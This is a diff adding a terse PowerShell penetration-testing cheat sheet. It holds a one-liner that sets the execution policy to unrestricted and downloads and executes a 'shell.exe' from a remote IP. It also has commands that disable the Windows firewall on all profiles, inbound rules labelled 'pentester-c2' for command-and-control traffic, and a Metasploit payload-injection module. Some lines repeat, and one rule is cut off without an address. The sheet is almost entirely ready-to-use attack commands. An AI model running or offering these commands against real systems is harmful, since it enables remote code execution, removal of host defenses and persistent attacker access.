@@ -1,0 +1,31 @@
+POWERSHELL
+set-executionpolicy unrestricted
+
+IEX (New-Object Net.Webclient).DownloadString(“http://10.11.0.220/shell.exe”)
+
+
+Set-NetFirewallProfile to Disable/Enable the Windows Firewall:
+
+
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+
+
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+
+New-NetFirewallRule to add allow a specific IP address to connect:
+
+New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress
+
+new-netfirewallrule -action allow -localport 80 -direction inbound -protocol tcp -displayname pentester-c2  
+
+New-NetFirewallRule to allow connections on a specific port:
+
+new-netfirewallrule -action allow -localport 80 -direction inbound -protocol tcp -displayname pentester-c2
+
+Turning Meterpreter into PowerShell  
+
+post/windows/manage/payload_inject  
+
+
+
